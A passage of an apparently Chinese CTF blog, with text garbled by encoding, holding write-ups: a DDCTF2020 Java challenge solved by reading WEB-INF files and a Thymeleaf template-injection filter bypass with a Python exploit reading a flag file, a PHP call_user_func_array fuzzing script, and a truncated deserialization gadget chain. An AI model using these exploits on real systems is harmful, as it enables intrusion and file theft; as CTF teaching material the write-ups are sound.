<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- è‡ªåŠ¨æ‰«æ Controller åŒ… --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ctf.controller&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ctf.repository&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ctf.service&quot;</span>/&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- æ³¨è§£é…ç½®å’Œä¹±ç å¤„ç† --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>çŒœæµ‹ä»–ä»¬çš„Authï¼ŒLoginç­‰å¯¹åº”çš„Controllerç±»å<br><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class</a></p>
<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class</a></p>
<p>æ‹¿åˆ°Adminçš„è·¯ç”±ï¼š<code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index</code>ï¼ŒåŒæ ·æƒé™ç»•è¿‡<br>å‘ç°æç¤ºRenderï¼Œç›²çŒœåˆæ˜¯SSTI</p>
<p>æ£€æµ‹JAVAçš„SSTIå‘ç°<code>[[$&#123;7*7&#125;]]</code>æˆåŠŸæ‰§è¡Œï¼Œè¿™æ˜¯ä¸€ä¸ªThymeleaf æ¨¡æ¿æ³¨å…¥</p>
</li>
</ol>
<p>è¿›å…¥ä¸‹ä¸€æ­¥SSTI</p>
<p>ctfFilterè¿‡æ»¤äº†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] blacklists = &#123; <span class="string">&quot;java.+lang&quot;</span>, <span class="string">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;</span>, <span class="string">&quot;exec.*\\(&quot;</span>, <span class="string">&quot;write|read&quot;</span>, <span class="string">&quot;invoke.*\\(&quot;</span>, <span class="string">&quot;\\.forName.*\\(&quot;</span>, <span class="string">&quot;lookup.*\\(&quot;</span>, <span class="string">&quot;\\.getMethod.*\\(&quot;</span>, <span class="string">&quot;javax.+script.+ScriptEngineManager&quot;</span>, <span class="string">&quot;com.+fasterxml&quot;</span>, <span class="string">&quot;org.+apache&quot;</span>, <span class="string">&quot;org.+hibernate&quot;</span>, <span class="string">&quot;org.+thymeleaf&quot;</span>, <span class="string">&quot;javassist&quot;</span>, <span class="string">&quot;javax\\.&quot;</span>, <span class="string">&quot;eval.*\\(&quot;</span>, <span class="string">&quot;\\.getClass\\(&quot;</span>, <span class="string">&quot;org.+springframework&quot;</span>, <span class="string">&quot;javax.+el&quot;</span>, <span class="string">&quot;java.+io&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨Thymeleaf ç‰¹æ€§ç»•è¿‡</p>
<p><code>[[*&#123;__$&#123;#strings.replace(param.foo[0],param.bbb[0],param.t[0])&#125;__&#125;]]</code></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> gen</span><br><span class="line"><span class="comment">#  private static String[] blacklists = &#123; &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, </span></span><br><span class="line"><span class="comment"># &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, </span></span><br><span class="line"><span class="comment"># &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;,</span></span><br><span class="line"><span class="comment">#  &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; &#125;;</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;param.foo&quot;</span></span><br><span class="line">payload =<span class="string">&#x27;&#x27;&#x27;&lt;p th:text=$&#123;%s&#125;&gt;&lt;/p&gt;&#x27;&#x27;&#x27;</span>%code</span><br><span class="line">cmd=payload</span><br><span class="line">cmd=<span class="string">&quot;&quot;&quot;[[*&#123;__$&#123;#strings.replace(param.foo[0],param.bbb[0],param.t[0])&#125;__&#125;]] &quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br><span class="line">burp0_url = <span class="string">&quot;http://116.85.37.131:80/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://116.85.37.131&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">burp0_data = &#123;<span class="string">&quot;content&quot;</span>: cmd&#125;</span><br><span class="line">response=requests.post(burp0_url, headers=burp0_headers, data=burp0_data).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    redirect = re.search(<span class="string">&#x27;fetch \./(.*) !&#x27;</span>, response).group(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">url = <span class="string">&#x27;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/&#x27;</span></span><br><span class="line">url += redirect</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(requests.get(url,params=&#123;<span class="string">&quot;foo&quot;</span>:<span class="string">&quot;NEW java.util.Scanner(NEW java.i@o.BufferedRea@der(new java.i@o.Fi@leRe@ad@er(new java.i@o.Fi@le(&quot;</span>+gen.gen(<span class="string">&quot;/flag_is_here&quot;</span>)+<span class="string">&quot;)))).nextLine()&quot;</span>,<span class="string">&quot;bbb&quot;</span>:<span class="string">&#x27;@&#x27;</span>,<span class="string">&quot;t&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&#x27;g&#x27;</span>:<span class="string">&#x27;ls&#x27;</span>&#125;,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;).text)</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/09/06/DDCTF2020/" data-id="ckw7zp3xr001hftn7g7qsd16e" data-title="DDCTF2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ciscn2020easyphpå‡ºé¢˜ç¬”è®°" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/20/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2020-08-20T16:00:00.000Z" itemprop="datePublished">2020-08-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">æ‚</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/20/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">ciscn2020easyphpå‡ºé¢˜ç¬”è®°</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="easyphpå‡ºé¢˜ç¬”è®°"><a href="#easyphpå‡ºé¢˜ç¬”è®°" class="headerlink" title="easyphpå‡ºé¢˜ç¬”è®°"></a>easyphpå‡ºé¢˜ç¬”è®°</h1><p>è¿™é¢˜åŸæ„æ˜¯æƒ³è®©å¤§å®¶å†™è„šæœ¬æ¥fuzzæ¥å‘ç°CUFA/CUFä¸­å¯¹å¼•ç”¨å¤„ç†ä¸æ°å½“è€Œé€ æˆçš„å´©æºƒï¼Œç‰¹æ„ç¦æ­¢äº†pcntlå¯æ˜¯ç”±äºæ²¡æœ‰è®¤çœŸæµ‹è¯•ï¼Œå¿˜è®°äº†è¿˜æœ‰CUFè¿™ä¸ªå‡½æ•°ï¼Œç»“æœæœ‰äººç›´æ¥ç»•è¿‡äº†ã€‚</p>
<p>å‡ºé¢˜äººæƒ³å¹²çš„äº‹æƒ…å°±æ˜¯æˆ‘ä»¬ä¸è®©ä»–å¹²æˆå°±æ˜¯å¯¹è¿™ç§æƒ…å†µçš„æœ€å¥½è§£é‡Šã€‚æœ€åçœ‹åˆ°è‡ªå·±çš„é¢˜ç›®è¢«è§£æˆé‚£æ ·ï¼Œæˆ‘ä¹Ÿæ˜¯è‡ªé—­äº†ã€‚</p>
<p>ç»§ç»­æ­£é¢˜å§ã€‚</p>
<h2 id="æ¥ç”±"><a href="#æ¥ç”±" class="headerlink" title="æ¥ç”±"></a>æ¥ç”±</h2><p>ä¹‹æ‰€ä»¥ä¼šå‡ºç°è¿™é¢˜æ˜¯å› ä¸ºå‰æ®µæ—¶é—´çš„wmctfçš„webwebååºåˆ—åŒ–å‡ºæœ‰è¿™æ ·ä¸€å¤„çš„åˆ©ç”¨ç‚¹ï¼Œæˆ‘ä¸ºäº†æ‰¾åˆ°åˆé€‚çš„å‡½æ•°å°±é‡‡å–fuzzï¼Œä¸œè¥¿æ²¡å‘ç°å€’æ˜¯å‘ç°phpå´©æºƒäº†ã€‚</p>
<h2 id="æ¼æ´ç»†èŠ‚"><a href="#æ¼æ´ç»†èŠ‚" class="headerlink" title="æ¼æ´ç»†èŠ‚"></a>æ¼æ´ç»†èŠ‚</h2><p>ç›´æ¥å»çœ‹<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=79979">bugs.php</a> ä¸Šé¢çš„ï¼Œä¼šä¸ä¼šæ˜¯å› ä¸ºäº¤åˆ°bugs.phpä¸Šçš„åŸå› å¯¼è‡´è¿™ä¹ˆå¤šäººè§£äº†ï¼Ÿ</p>
<h2 id="åŸè§£"><a href="#åŸè§£" class="headerlink" title="åŸè§£"></a>åŸè§£</h2><p>é˜…è¯»ä»£ç æˆ‘ä»¬å‘ç°:<code>if(!pcntl_wifexited($status))&#123;phpinfo();&#125;</code>ï¼ŒåŠforkçš„å­è¿›ç¨‹æŠ¥é”™å°±ä¼šæ‰§è¡Œphpinfoï¼Œè€Œphpinfoé‡Œé¢é€šå¸¸åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå’Œä¸€äº›å¯¹æˆ‘ä»¬é¢˜ç›®æœ‰å¸®åŠ©çš„ä¿¡æ¯ã€‚</p>
<p>forkå­è¿›ç¨‹æ‰§è¡Œçš„ä»£ç æ˜¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br></pre></td></tr></table></figure>

<p>è€Œè¿™é‡Œè°ƒç”¨äº†éå¸¸æ•æ„Ÿçš„call_user_func_arrayï¼Œæ‰€ä»¥æ— è®ºæ˜¯æƒ³è®©å­è¿›ç¨‹æŠ¥é”™è¿˜æ˜¯ç›´æ¥æ‰§è¡Œä»£ç è¿™é‡Œéƒ½æ˜¯éå¸¸å¥½çš„é€‰æ‹©ã€‚å› æ­¤æˆ‘ä»¬å…ˆè¦å†™ä¸ªfuzzè„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$payloads</span>=[</span><br><span class="line">        <span class="string">&quot;ls&quot;</span>,<span class="comment">//shellå‘½ä»¤æ‰§è¡Œæµ‹è¯•</span></span><br><span class="line">        <span class="string">&quot;index.php&quot;</span>,<span class="comment">//è¯»å–æ–‡ä»¶æµ‹è¯•</span></span><br><span class="line">        <span class="string">&quot;asdfasldfjaklsdfjl.php&quot;</span>,<span class="comment">//åˆ›å»ºæ–‡ä»¶/æ–‡ä»¶å¤¹æµ‹è¯•</span></span><br><span class="line">        <span class="string">&quot;echo 123;&quot;</span><span class="comment">//phpå‘½ä»¤æ‰§è¡Œæµ‹è¯•</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$str</span>=file_get_contents(<span class="string">&quot;fatalerr.log&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="string">&quot;[]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fatalerror</span>=<span class="keyword">eval</span>(<span class="string">&quot;return &quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_result</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$r</span>,<span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$r</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$func</span>(<span class="subst">$v</span>,false,true) return value:&quot;</span>;</span><br><span class="line">            var_dump(<span class="variable">$r</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">brute_func</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$payloads</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$fatalerror</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$val</span>))&#123;</span><br><span class="line">                brute_func(<span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$val</span>,<span class="variable">$fatalerror</span>))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            array_push(<span class="variable">$fatalerror</span>,<span class="variable">$val</span>);</span><br><span class="line">            file_put_contents(<span class="string">&quot;fatalerr.log&quot;</span>,var_export(<span class="variable">$fatalerror</span>,<span class="literal">TRUE</span>));</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$payloads</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="variable">$r</span>=<span class="literal">NULL</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$r</span>=call_user_func_array(<span class="variable">$val</span>,[<span class="variable">$v</span>,<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">                show_result(<span class="variable">$val</span>,<span class="variable">$r</span>,<span class="variable">$v</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            array_pop(<span class="variable">$fatalerror</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$arr</span>=get_defined_functions();</span><br><span class="line">    brute_func(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>å¤šæ¬¡æ‰§è¡Œå‘ç°ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_server</span><br><span class="line">exec</span><br><span class="line">stream_socket_client</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸‰ä¸ªå‡½æ•°ä¼šå¼•èµ·segment_fault ä¸” execè™½ç„¶ä¼šå¼•èµ·segment  faultä½†æ˜¯ä»ç„¶æ‰§è¡Œäº†ä»£ç ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ç¦ç”¨äº†execæ‰€ä»¥æˆ‘ä»¬ç”¨å¦å¤–ä¸¤ä¸ªå‡½æ•°å¼•èµ·segment faultæŸ¥çœ‹phpinfoï¼Œåœ¨phpinfoä¸­æ‰¾åˆ°flagã€‚</p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>å¸Œæœ›æœ‰å¸ˆå‚…æœ‰ä¸åŒçš„è§£å¯ä»¥ç•™ä¸ªè¨€å•¥çš„è°¢è°¢å•¦</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/08/20/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" data-id="ckw7zp3yw003sftn79uefeoxp" data-title="ciscn2020easyphpå‡ºé¢˜ç¬”è®°" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">å‡ºé¢˜ç¬”è®°</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ciscn2020é¢„é€‰èµ›" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/20/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" class="article-date">
  <time class="dt-published" datetime="2020-08-20T16:00:00.000Z" itemprop="datePublished">2020-08-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/20/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020é¢„é€‰èµ›</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ciscn-2020-é¢„é€‰èµ›"><a href="#ciscn-2020-é¢„é€‰èµ›" class="headerlink" title="ciscn 2020 é¢„é€‰èµ›"></a>ciscn 2020 é¢„é€‰èµ›</h1><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>å’Œwmctf2020çš„webwebpayloadç›¸åŒ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">phpinfo</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[-1=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span 